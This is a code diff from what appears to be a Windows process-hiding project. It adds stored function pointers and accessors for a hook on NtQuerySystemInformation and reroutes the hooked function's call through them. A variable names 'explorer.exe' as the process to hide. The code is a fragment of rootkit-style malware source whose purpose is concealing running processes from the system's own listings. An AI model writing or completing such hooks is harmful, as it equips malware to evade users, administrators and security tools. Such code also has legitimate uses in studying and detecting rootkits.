@@ -5,6 +5,29 @@
 
 const wchar_t* m_ProcessToHide = L"explorer.exe";
 
+TD_NtQuerySystemInformation oldNtQuery;
+TD_NtQuerySystemInformation hookNtQuery;
+
+TD_NtQuerySystemInformation GetHookNtQuery()
+{
+    return hookNtQuery;
+}
+
+TD_NtQuerySystemInformation GetOldHookNtQuery()
+{
+    return oldNtQuery;
+}
+
+VOID SetHookNtQuery(TD_NtQuerySystemInformation p_HookNtQuery)
+{
+    hookNtQuery = p_HookNtQuery;
+}
+
+VOID SetOldHookNtQuery(TD_NtQuerySystemInformation p_OldHookNtQuery)
+{
+    oldNtQuery = p_OldHookNtQuery;
+}
+
 NTSTATUS WINAPI NewNtQuerySystemInformation(
     __in       SYSTEM_INFORMATION_CLASS SystemInformationClass,
     __inout    PVOID                    SystemInformation,
@@ -12,7 +35,7 @@ NTSTATUS WINAPI NewNtQuerySystemInformation(
     __out_opt  PULONG                   ReturnLength
     )
 {
-    NTSTATUS status = ((TD_NtQuerySystemInformation) hooking_getOldFunction("NtQuerySystemInformation"))(SystemInformationClass,
+    NTSTATUS status = hookNtQuery(SystemInformationClass,
         SystemInformation,
         SystemInformationLength,
         ReturnLength);
